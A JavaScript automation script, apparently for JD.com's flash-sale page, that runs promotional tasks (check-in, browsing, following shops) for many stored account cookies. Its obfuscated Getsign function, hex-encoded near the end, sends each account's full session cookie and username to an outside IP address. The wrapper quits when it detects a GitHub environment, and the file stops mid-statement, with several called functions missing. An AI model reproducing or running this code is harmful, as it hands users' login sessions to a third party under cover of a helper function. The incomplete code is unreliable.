/*
京东秒杀
入口：[京东App京东秒杀]
15 7,12,16 * * * Sami_jd_ms.js
为了控制流量，请自定义执行时间，如果账号多，最好每小时执行一次。
如有报错，请及时拉库
*/

const $ = new Env("京东秒杀")
const Ver = '20220516';
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
!(async () => {
    await $.wait(1000);
    await VerCheck("jdms",Ver);
    await $.wait(1000);
    requireConfig()
    await $.wait(5000);
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.nickName = '';
        $.Flag = false;
        $.UserName1 =encodeURIComponent($.UserName)
        console.log(`\n账号【${$.index}】${$.UserName} 京东秒杀信息`);
        //**********************************************************************
        let data = await GetsignRedPackage($.UserName1);
        if (data.code===100){
            let result = await signRedPackage(RedPackageBody1(data.data,data.data1))
            //console.log(result);
            if(result.code==200){
                console.log('签到结果:'+result.result.assignmentResult.msg);
                console.log('签到获得:🧧'+result.result.discountTotal+'元');
                await SetsignRedPackage($.UserName1);
               
            }else if(data.code==2025){
                console.log("签到活动：抱歉活动太火爆~");
            }
        }else if (data.code===101){
            console.log("你已经签过到");
        }else{
            console.log("信息返回异常，请稍后重试！！！");
        }
        //**********************************************************************
        $.Flag = false;//浏览2个商品可得
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(JSON.stringify(data))
            
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='浏览4个商品可得'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.productsInfo[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                if(vo.ext.productsInfo[0].hasOwnProperty('itemId')){
                                    getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"2uDJwT52KnfQFTo46gUcXB7aDjyY","itemId":"'+vo.ext.productsInfo[0].itemId+'","actionType":0,"sourceCode":"ace35880","completionFlag":"","ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                    //console.log(getsignbody)
                                    data = await signRedPackage(getsignbody);
                                    console.log('浏览2个商品可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                    await $.wait(2000);
                                }
                                
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('浏览2个商品:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("浏览商品：抱歉活动太火爆~");
                break;
                
            }
        }
        console.log('OK')
        //await $.wait(50000);
        //**********************************************************************
        $.Flag = false;//浏览即可得
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(data)
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='浏览即可得'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.productsInfo[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"2k7XTjVedY3VRT6NXZycf46e9Xsy","itemId":"'+vo.ext.shoppingActivity[0].advId+'","actionType":0,"sourceCode":"ace35880","completionFlag":"","ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                //console.log(getsignbody)
                                data = await signRedPackage(getsignbody);
                                console.log('浏览即可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                await $.wait(2000);
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('浏览即可得:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("浏览即可得：抱歉活动太火爆~");
                break;
                
            }
        }
        //**********************************************************************
        $.Flag = false;//逛逛每周瓜分亿万京豆活动
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(data)
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='参与种豆得豆可得'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.productsInfo[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"'+vo.encryptAssignmentId+'","itemId":"'+vo.ext.shoppingActivity[0].advId+'","actionType":0,"sourceCode":"ace35880","completionFlag":"","ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                //console.log(getsignbody)
                                data = await signRedPackage(getsignbody);
                                console.log('参与种豆得豆可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                await $.wait(2000);
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('参与种豆得豆可得:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("参与种豆得豆可得：抱歉活动太火爆~");
                break;
                
            }
        }
        //**********************************************************************
        $.Flag = false;//浏览15s即可得
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(data)
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='浏览15s即可得' && vo.encryptAssignmentId =='3CB3RTH3AWeLZrVSWgfwkrSSugYq'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.productsInfo[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"3CB3RTH3AWeLZrVSWgfwkrSSugYq","itemId":"'+vo.ext.shoppingActivity[0].advId+'","actionType":1,"sourceCode":"ace35880","completionFlag":"","ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                //console.log(getsignbody)
                                data = await signRedPackage(getsignbody);
                                console.log('浏览15s即可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                await $.wait(20000);
                                data= await look15();
                                //console.log(data)
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('浏览15s即可得:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("浏览即可得：抱歉活动太火爆~");
                break;
                
            }
        }
        //**********************************************************************
        $.Flag = false;//关注3个店铺可得
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(data)
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='关注3个店铺可得'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.followShop[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                followShopbody='functionId=followShop&body={"shopId":"'+vo.ext.followShop[0].itemId+'","follow":true,"type":"0"}&client=wh5&clientVersion=1.0.0&uuid=1598549349903714421101.433.1647916731887'
                                //console.log(getsignbody)
                                data = await followShop(followShopbody);
                                console.log('关注3个店铺可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                await $.wait(2000);
                                getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"48D123vRKRL6UyCUvJ8SBf9r6guP","itemId":"'+vo.ext.followShop[0].itemId+'","actionType":1,"sourceCode":"ace35880","completionFlag":"","ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                data = await signRedPackage(getsignbody);
                                //console.log(data)
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('关注3个店铺可得:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("浏览即可得：抱歉活动太火爆~");
                break;
                
            }
        }
         //**********************************************************************
        $.Flag = false;//最高2次,每次分享可得
        for (let j = 0; j < 5; j++) {
            if($.Flag == true){
                break;
            }
            data = await home();
            //console.log(data)
            if(data.code==200){
                if(data.result.sysCode=='35880'){
                    for (let vo of data.result.assignmentResult.assignmentList ){
                        //console.log(vo.assignmentDesc)
                        if(vo.assignmentDesc=='最高2次,每次分享可得'){
                            if(vo.completionCnt<vo.assignmentTimesLimit){
                                
                                //console.log(vo.ext.productsInfo[0].itemId);
                                data2 =await Getsign($.UserName1);
                                //console.log(data2);
                                getsignbody='functionId=doInteractiveAssignment&body={"extParam":{"businessData":{"random":"08534827"},"signStr":"'+data2.data+data2.data1+'","sceneid":"MShPageh5"},"encryptProjectId":"4Rxa9S9Vcgmq5zVtPJzNdFwpzsar","encryptAssignmentId":"2RKEBYP3jRRSJEjYc6ZCBZkPsACM","itemId":"'+vo.rewards[0].rewardId+'","actionType":0,"sourceCode":"ace35880","completionFlag":true,"ext":{}}&client=wh5&clientVersion=1.0.0&uuid=15985439329903714461101.432.1647852845429'
                                //console.log(getsignbody)
                                data = await signRedPackage(getsignbody);
                                console.log('最高2次,每次分享可得共'+vo.assignmentTimesLimit+'个,当前:'+vo.completionCnt+' '+data.msg)
                                await $.wait(2000);
                                //data= await look15();
                                //console.log(data)
                                break;
                            }else{
                               $.Flag = true; 
                               console.log('最高2次,每次分享可得:任务已完成')
                            }
                        }
                    }
                }else{
                    console.log("数据错误");
                }
            }else if(data.code==202){
                console.log("浏览即可得：抱歉活动太火爆~");
                break;
                
            }
        }
        
        
        
        await $.wait(5000);
    }
    
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })



function signRedPackage(body={}) {
    return new Promise(resolve => {
        $.post({
            url: JD_API_HOST,
            headers: {
                "Cookie": cookie,
                "origin": " https://h5.m.jd.com",
                "referer": "https://h5.m.jd.com/babelDiy/Zeus/49kqxHMcyh6ZgbodooSPvv6Vt5Qv/index.html",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            },
            body: body,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

function followShop(body={}) {
    return new Promise(resolve => {
        $.post({
            url: JD_API_HOST,
            headers: {
                "Cookie": cookie,
                "origin": " https://h5.m.jd.com",
                "referer": "https://h5.m.jd.com/babelDiy/Zeus/49kqxHMcyh6ZgbodooSPvv6Vt5Qv/index.html",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            },
            body: body,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

function home() {
    return new Promise(resolve => {
        $.post({
            url: JD_API_HOST,
            headers: {
                "Cookie": cookie,
                "origin": " https://h5.m.jd.com",
                "referer": "https://h5.m.jd.com/babelDiy/Zeus/49kqxHMcyh6ZgbodooSPvv6Vt5Qv/index.html?sid=2856b947a4a73c386c2cd3906bc13a5w&un_area=12_904_905_50601",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            },
            body: 'uuid=1594539339903714422201.432.1647851945670&clientVersion=10.3.2&client=wh5&osVersion=&area=14_924_915_52611&networkType=unknown&functionId=assignmentList&body=%7B%7D&appid=jwsp',
        }, (_, resp, data) => {
            try {
                //console.log(data)
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

function look15() {
    return new Promise(resolve => {
        $.post({
            url: 'https://106.39.169.231/client.action?functionId=qryViewkitCallbackResult',
            headers: {
                "Cookie": cookie,
                "Host": "api.m.jd.com",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": ua
            },
            body: 'body=%7B%22dataSource%22%3A%22babelInteractive%22%2C%22method%22%3A%22customDoInteractiveAssignmentForBabel%22%2C%22reqParams%22%3A%22%7B%5C%22itemId%5C%22%3A%5C%221601428683%5C%22%2C%5C%22encryptProjectId%5C%22%3A%5C%224Rxa9S9Vcgmq5zVtPJzNdFwpzsar%5C%22%2C%5C%22encryptAssignmentId%5C%22%3A%5C%223CB3RTH3AWeLZrVSWgfwkrSSugYq%5C%22%7D%22%7D&build=167922&client=apple&clientVersion=10.3.2&d_brand=apple&d_model=iPhone10%2C2&ef=1&eid=eidI24d781231bs1iTGH8ZbsSEukVSdfFyjhN4kxiWXHSrYWZlESey1gWClSeNPIWaiskUd3%2BLUa%2But1VrRN3I/u4UbuOdicnjjwh/XZnMeBQx7EO/ZO&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJS0CseyCtK4%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22wifiBssid%22%3A%22ZtczCtKmYJCzDtY5ZNu4CWC1CQGmEJu4CNVwEQPuYwG%3D%22%2C%22osVersion%22%3A%22CJCkDq%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%2C%22adid%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%2C%22openudid%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%7D%2C%22ts%22%3A1647852785%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=84&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=67f4e40dad736f9f63d436234708e01b&st=1647872239136&sv=100&uemps=0-0&uts=0f31TVRjBSu/sZla2geQLFWY8lVsHG8bhnpCjfFXf6ozxb7VLc0EVC6uoUejCA5Lrfsu%2BEzD/EE8QvdT/29uZlCFHbXKPJYbMYSCBuMC/NoPSbHv0I/ZvPRUppcL62NaRLMYDYtDZ8kEcjGEqSpdbf11Pg8HRQHEFvE2GbtNUffX6AX5Z0W3BorfCTMw4NBGe03KDSL%2B8Kr6iSat1gZQUg%3D%3D'
        }, (_, resp, data) => {
            try {
                //console.log(data)
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

function RedPackageBody1(data,data1){
  return 'uuid=000.10.1642657909204&clientVersion=10.3.2&client=wh5&osVersion=&area=1_72_2799_0&networkType=unknown&functionId=signRedPackage&body={"random":"08534827","log":"'+data+data1+'","sceneid":"MShPageh5","ext":{"platform":"1","eid":"eidAb2388120fds1AlNRMNaOS6aPGR5sQJkKEwJTUq8+lfcES1nYkj8legsFPAy7MTirLFNIC4/aN6MpRY9h9/z/nFdwUr9pWauK0uOc9V1F0LW85kZJ","referUrl":-1,"userAgent":-1}}&appid=SecKill2020'
}



function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}


function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `"${num}"`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}

//浏览商品签名获取
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdbe9b=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6C\x6F\x6F\x6B\x6D\x73","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function Getsign(_0xaf87x2){return  new Promise((_0xaf87x3)=>{$[__Oxdbe9b[0x4]]({url:`${__Oxdbe9b[0x0]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0xaf87x2,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0xaf87x4,_0xaf87x5,_0xaf87x6)=>{try{_0xaf87x6= JSON[__Oxdbe9b[0x1]](_0xaf87x6)}catch(e){$[__Oxdbe9b[0x3]](__Oxdbe9b[0x2],e,_0xaf87x5)}finally{_0xaf87x3(_0xaf87x6)}})})}(function(_0xaf87x7,_0xaf87x8,_0xaf87x9,_0xaf87xa,_0xaf87xb,_0xaf87xc){_0xaf87xc= __Oxdbe9b[0x5];_0xaf87xa= function(_0xaf87xd){if( typeof alert!== _0xaf87xc){alert(_0xaf87xd)};if( typeof console!== _0xaf87xc){console[__Oxdbe9b[0x6]](_0xaf87xd)}};_0xaf87x9= 